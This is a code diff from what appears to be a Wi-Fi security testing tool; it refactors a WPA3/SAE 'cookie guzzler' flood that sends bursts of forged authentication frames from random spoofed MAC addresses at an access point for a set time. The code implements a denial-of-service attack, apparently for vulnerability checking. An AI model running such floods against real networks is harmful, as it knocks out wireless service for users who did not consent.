@@ -59,34 +59,10 @@ void check_vuln(const string &iface_name, const HWAddress<6> &ap_mac, const int 
 				const size_t packets_per_second_limit
 ){
 	PacketSender sender(iface_name);
-	long long counter = 0;
-	long long next_log = 0;
-
-	const auto end_time = steady_clock::now() + seconds(attack_time);
-	while(steady_clock::now() < end_time){
-		const auto burst_start = steady_clock::now();
-
-		const string sta_mac = firmware::get_random_ath_masker_mac(att_mac);
-		auto cg_frame = get_cookie_guzzler_frame(ap_mac, sta_mac, sae_params);
-
-		//  burst of packet
-		for(size_t i = 0; i < burst_size; ++i){
-			sender.send(cg_frame);
-		}
-
-		// Rate control: 64 packets / 1000 pkt/s = 64ms per burst
-		auto target_burst_duration = microseconds(burst_size * 1'000'000 / packets_per_second_limit);
-		if(const auto elapsed = steady_clock::now() - burst_start; elapsed < target_burst_duration)
-			this_thread::sleep_for(target_burst_duration - elapsed);
-
-		counter += burst_size;
-
-		if(counter >= next_log){
-			log(LogLevel::DEBUG, "Packets sent: " + to_string(counter));
-			next_log += 10*burst_size;
-		}
-	}
-	log(LogLevel::INFO, "Done. Total packets sent: " + to_string(counter));
+	dos_helpers::timed_burst(sender, attack_time, burst_size, packets_per_second_limit,
+	[&]() -> optional<RadioTap>{
+		return get_cookie_guzzler_frame(ap_mac, firmware::get_random_ath_masker_mac(att_mac), sae_params);
+	});
 }
 
 void run_attack(RunStatus &rs){
